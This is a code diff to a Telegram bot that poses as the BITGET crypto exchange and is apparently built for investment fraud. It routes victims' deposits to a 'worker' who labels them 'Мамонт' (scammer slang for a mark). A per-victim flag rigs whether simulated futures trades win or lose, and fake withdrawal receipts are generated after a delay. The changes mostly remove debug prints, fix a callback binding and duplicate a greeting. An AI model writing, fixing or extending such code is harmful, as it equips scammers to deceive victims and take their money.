@@ -40,7 +40,7 @@ async def start_handler(message: types.Message, state: FSMContext):
 
     file = config.START_FILE_ID
     await message.answer_photo(file, reply_markup=keyboards.main_reply(message.from_user.id))
-    await message.answer('<b>🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!</b>', reply_markup=keyboards.start_inline())
+    await message.answer('<b>🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!</b>', reply_markup=keyboards.start_inline())
 
 async def profile_handler(message: types.Message, state: FSMContext):
     file = config.CABINET_FILE_ID
@@ -97,7 +97,7 @@ async def set_requisites_withdraw_handler(message: types.Message, state: FSMCont
     
     if cfg.withdraw == 1:
         if req not in config.reqs:
-            await message.answer("<b>Вывод доступен только на ваши реквезиты, с которых выполнялось пополнение</b>")
+            await message.answer("<b>Вывод доступен только на ваши реквизиты, с которых выполнялось пополнение</b>")
             return
     data = await state.get_data()
     await state.finish()
@@ -121,7 +121,6 @@ async def set_requisites_withdraw_handler(message: types.Message, state: FSMCont
         await bot.delete_message(message.chat.id, data['message'].message_id)
     except Exception:
         pass  
-    print(cfg.withdraw)
     if cfg.withdraw == 1:
         time.sleep(random.randint(120, 150))
         file_path = utils.withdraw_photo(req, data['price'], message.from_user.first_name)
@@ -149,13 +148,13 @@ async def set_requisites_withdraw_handler(message: types.Message, state: FSMCont
         
         # Поставил на вывод: {data['price']} RUB 
         
-        # Реквезиты: {message.text}'''
+        # ч: {message.text}'''
 
         await bot.send_message(worker_id, text, reply_markup=keyboards.withdraw_admin(message.chat.id, message.text, data['price']))
 
 async def withdraw_yes_handler(call: types.CallbackQuery, state: FSMContext):
     user_id = int(call.data.split('$')[1])
-    req = int(call.data.split('$')[2])
+    req = call.data.split('$')[2]
     price = int(call.data.split('$')[3])
     await call.message.delete()
     await call.message.answer('Отправлено!')
@@ -165,7 +164,6 @@ async def withdraw_yes_handler(call: types.CallbackQuery, state: FSMContext):
     await bot.send_photo(user_id, file, caption='Заявка на вывод успешно выполнена!')
     try:
         os.remove(file_path)
-        print(f"File '{file_path}' removed successfully!")
     except FileNotFoundError:
         print(f"File '{file_path}' not found!")
     except PermissionError:
@@ -207,7 +205,6 @@ async def wit_fiat(call: types.CallbackQuery, state: FSMContext):
     text ='''📝 Введите Ваши реквизиты банковской карты
 
 ⚠️ Учтите, вывод возможен только на реквизиты, с которых пополнялся Ваш баланс в последний раз. Реквизиты для вывода меняются автоматически после пополнения с другой карты или платёжной системы.'''
-    print(text)
 
     await call.message.edit_caption(caption=text, reply_markup=keyboards.back_to_menu())
 
@@ -304,14 +301,12 @@ async def send_dep_amount_handler(message: types.Message, state: FSMContext):
     )
     depo.save()
     cfg = utils.get_my_config_id(message.from_user.id)
-    print(cfg)
     text = f'''Новоя заявка на пополнение
 Мамонт: <a href="{message.chat.user_url}">{message.from_user.first_name}</a>
 ID: {message.from_user.id}
     
 Размер: {price}
 Тип: {data['type']}'''
-    print(text)
     await bot.send_message(cfg, text, reply_markup=keyboards.send_deposite(depo.id))
     await message.answer_photo(config.DEPOSITE_FILE_ID, caption=TEXTS.deposite_message(price, user, data["type"]), reply_markup=keyboards.check_deposite(id=depo.id))
 
@@ -366,7 +361,6 @@ async def send_future_time_hand_amount_handler(message: types.Message, state: FS
     data["future"].save()
     await state.update_data(future=data["future"])
 
-    print('started', data['future'])
 
 
 async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext):
@@ -383,7 +377,6 @@ async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext)
     await state.update_data(future=data["future"])
 
     await call.message.delete()
-    print('started', data['future'])
 
     # await call.message.edit_caption(caption=TEXTS.info_future(data["future"]), reply_markup=keyboards.setCredit())
     
@@ -422,7 +415,6 @@ async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext)
 
     mes = await call.message.answer(TEXTS.info_future(data["future"], 0, new_price=data['future'].start_price))
     if cfg.lucky == 1:
-        print('lucky 1')
         for i in range(data['future'].time):
             time.sleep(1)
             r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99050, 101050) / 100000, 4)
@@ -431,7 +423,6 @@ async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext)
             await mes.edit_text(TEXTS.info_future(data["future"], i, new_price=now_price))
     
     else:
-        print('Not random')
         for i in range(data['future'].time - 2):
             time.sleep(1)
             r_1 = round(config.crypto_list[data['future'].coin][1]*random.randint(99850, 100150) / 100000, 4)
@@ -440,7 +431,6 @@ async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext)
             await mes.edit_text(TEXTS.info_future(data["future"], i, new_price=now_price))
 
         if cfg.lucky == 0:
-            print('lose')
             if data['future'].type == 'long':
                 last_price = round(data['future'].start_price*random.randint(99850, 100000) / 100000, 4)
                 prices.append(random.uniform(prices[-1], last_price))
@@ -448,7 +438,6 @@ async def send_future_time_handler(call: types.CallbackQuery, state: FSMContext)
                 last_price = round(data['future'].start_price*random.randint(100000, 100150) / 100000, 4)
                 prices.append(random.uniform(prices[-1], last_price))
         else:
-            print('win')
             if data['future'].type == 'short':
                 last_price = round(data['future'].start_price*random.randint(99850, 100000) / 100000, 4)
                 prices.append(random.uniform(prices[-1], last_price))
@@ -597,6 +586,8 @@ async def cancel_deposite_handler(call: types.CallbackQuery, state: FSMContext):
     dep.is_canceled = True
     dep.save()
     await call.message.delete()
+    await call.message.answer('<b>🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!🔹 Добро пожаловать на мультивалютную крипто-биржу BITGET!</b>', reply_markup=keyboards.start_inline())
+    
 
 
 def register_handlers(dp: Dispatcher):
@@ -624,7 +615,7 @@ def register_handlers(dp: Dispatcher):
 	dp.register_callback_query_handler(send_future_credit_handler, text_startswith='set_credit', state='*')
 	dp.register_callback_query_handler(send_future_type_handler, text_startswith='set_type', state='*')
 	dp.register_callback_query_handler(check_deposite_handler, text_startswith='check_deposite', state='*')
-	dp.register_callback_query_handler(cancel_deposite_handler, text_startswith='check_deposite', state='*')
+	dp.register_callback_query_handler(cancel_deposite_handler, text_startswith='cancel', state='*')
 	dp.register_message_handler(support_handler, content_types=['text'], text='👨🏻‍💻Тех. Поддержка', state='*')
 	dp.register_message_handler(future_handler, content_types=['text'], text='📊 Опционы', state='*')
 	dp.register_message_handler(spot_handler, content_types=['text'], text='🪙 Спот', state='*')
